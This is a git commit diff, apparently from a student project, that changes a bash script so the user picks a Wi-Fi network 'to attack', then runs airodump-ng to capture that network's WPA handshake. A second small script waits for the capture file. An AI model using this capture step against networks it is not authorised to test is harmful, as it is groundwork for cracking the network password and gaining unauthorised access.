4e1921c91058dece2150d8c59d332b23737487ad
PatrickWumbo <jhuh009@ucr.edu>
2019-04-28 05:53:06 +0000

    we can choose network to attack now :)

--- scripts/captureHandshakes.sh
+++ scripts/captureHandshakes.sh
@@ -1,8 +1,24 @@
 #!/bin/bash
 
 #cat targetList.txt | awk '{print "BSSD: "$1 "\nChannel: "$6 "\nCrypto: "$8 "\nSSID: "$11}'
-targetBSSID=$(cat targetList.txt | awk '{print $1}')
-targetChannel=$(cat targetList.txt | awk '{print $6}')
+rm -rf *.cap
+
+echo "Choose which network to attack."
+cat network-list.txt
+
+read -r input
+
+#cat network-list.txt | awk -F":" 'BEGIN{print $i}' i="${input}"
+ssid=$(awk -v pat="$input" -F ":" '$0~pat{print $2}' network-list.txt)
+
+awk -v pat="$ssid" -F" " '$0~pat{print $2" "$3}' networks.txt > combined.txt
+#targetChannel=$(awk -v pat="$ssid" -F" " '$0~pat{print $3}' networks.txt)
+#$(awk -v pat="$ssid" -F" " '$0~pat{print $4}' networks.txt)> targetChannel.txt
 interface=$(cat interfaceToUse.txt)
+#echo $targetBSSID
+#echo $targetChannel
+#cat combined.txt
+targetChannel=$(awk -F " " 'FNR<2{print $2}' combined.txt)
+targetBSSID=$(awk -F " " 'FNR<2{print $1}' combined.txt)
 
 airodump-ng -c $targetChannel --bssid $targetBSSID -w psk $interface
---
+++ scripts/check.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+
+while [ true ]
+do
+	if [ -f *.cap ]; then
+		echo "BIH"
+		break
+	fi
+done
+
